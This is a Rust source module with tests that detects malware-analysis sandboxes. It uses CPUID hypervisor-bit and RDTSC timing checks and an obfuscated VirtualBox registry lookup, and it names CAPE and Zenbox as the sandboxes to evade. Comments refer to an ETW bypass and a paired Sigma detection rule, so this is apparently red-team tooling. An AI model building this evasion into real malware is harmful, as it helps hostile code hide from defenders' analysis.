//! Sandbox detection: CPUID hypervisor bit, RDTSC timing delta, VirtualBox registry.
//!
//! Limitation: CAPE v2 uses KVM with TSC offset patching to defeat RDTSC timing.
//! CPUID hypervisor bit can be cleared by hardened hypervisors.
//! VMMDevHelper registry key is VirtualBox-specific; CAPE/Zenbox use KVM/QEMU.
//! Treat as a first-pass filter against basic sandboxes, not production hardened sandboxes.
//!
//! Detection: see detection/sigma/evasion_sandbox_evasion.yml.

/// Returns true if any sandbox indicator is detected.
///
/// CPU checks use inline asm only (zero Windows API surface).
/// Registry check uses winreg (generates file I/O — call after etw::bypass()).
pub fn is_sandbox() -> bool {
    is_hypervisor_cpuid() || is_timing_anomalous() || is_virtualbox_registry()
}

/// CPUID EAX=1: ECX bit 31 is the "Hypervisor Present Bit".
/// Returns true if executing inside a hypervisor.
/// Note: modern hypervisors can clear this bit — not reliable against hardened sandboxes.
pub(super) fn is_hypervisor_cpuid() -> bool {
    #[cfg(target_arch = "x86_64")]
    {
        let ecx: u32;
        unsafe {
            core::arch::asm!(
                // rbx is reserved by LLVM for PIC; save/restore it manually.
                "push rbx",
                "cpuid",
                "pop rbx",
                inout("eax") 1u32 => _,
                inout("ecx") 0u32 => ecx,
                out("edx") _,
                options(nostack, nomem),
            );
        }
        (ecx >> 31) & 1 == 1
    }
    #[cfg(not(target_arch = "x86_64"))]
    {
        false
    }
}

/// RDTSC timing delta across a CPUID instruction.
/// On bare metal, CPUID EAX=0 costs ~50-200 cycles.
/// In most VMs, the VM-exit overhead pushes this above 750 cycles.
/// Returns true if timing suggests virtualization.
pub(super) fn is_timing_anomalous() -> bool {
    #[cfg(target_arch = "x86_64")]
    {
        let tsc1 = rdtsc();
        // CPUID with EAX=0 causes a VM-exit in most hypervisors.
        unsafe {
            core::arch::asm!(
                // rbx is reserved by LLVM for PIC; save/restore it manually.
                "push rbx",
                "cpuid",
                "pop rbx",
                inout("eax") 0u32 => _,
                out("ecx") _,
                out("edx") _,
                options(nostack, nomem),
            );
        }
        let tsc2 = rdtsc();
        tsc2.saturating_sub(tsc1) > 750
    }
    #[cfg(not(target_arch = "x86_64"))]
    {
        false
    }
}

/// Check for VirtualBox Guest Additions registry key.
/// Only relevant on VirtualBox — CAPE/Zenbox use KVM/QEMU (this key won't exist).
pub(super) fn is_virtualbox_registry() -> bool {
    #[cfg(target_os = "windows")]
    {
        use winreg::{enums::HKEY_LOCAL_MACHINE, RegKey};
        RegKey::predef(HKEY_LOCAL_MACHINE)
            .open_subkey(obfstr::obfstr!(r"SOFTWARE\Oracle\VirtualBox Guest Additions"))
            .is_ok()
    }
    #[cfg(not(target_os = "windows"))]
    {
        false
    }
}

#[cfg(target_arch = "x86_64")]
fn rdtsc() -> u64 {
    let lo: u32;
    let hi: u32;
    unsafe {
        core::arch::asm!(
            "rdtsc",
            out("eax") lo,
            out("edx") hi,
            options(nostack, nomem, preserves_flags),
        );
    }
    ((hi as u64) << 32) | lo as u64
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn is_sandbox_returns_bool() {
        // On the Linux build host, all checks return false (non-Windows, non-x86_64 checks
        // return false by cfg; is_virtualbox_registry cfg(target_os=windows) returns false).
        // Function must compile and return a bool without panicking.
        let _ = is_sandbox();
    }

    #[test]
    fn hypervisor_check_returns_bool() {
        let _ = is_hypervisor_cpuid();
    }

    #[test]
    fn timing_check_returns_bool() {
        let _ = is_timing_anomalous();
    }

    #[test]
    #[cfg(target_arch = "x86_64")]
    fn rdtsc_monotone() {
        let t1 = rdtsc();
        let t2 = rdtsc();
        // TSC must be non-decreasing between two consecutive reads.
        assert!(t2 >= t1);
    }
}
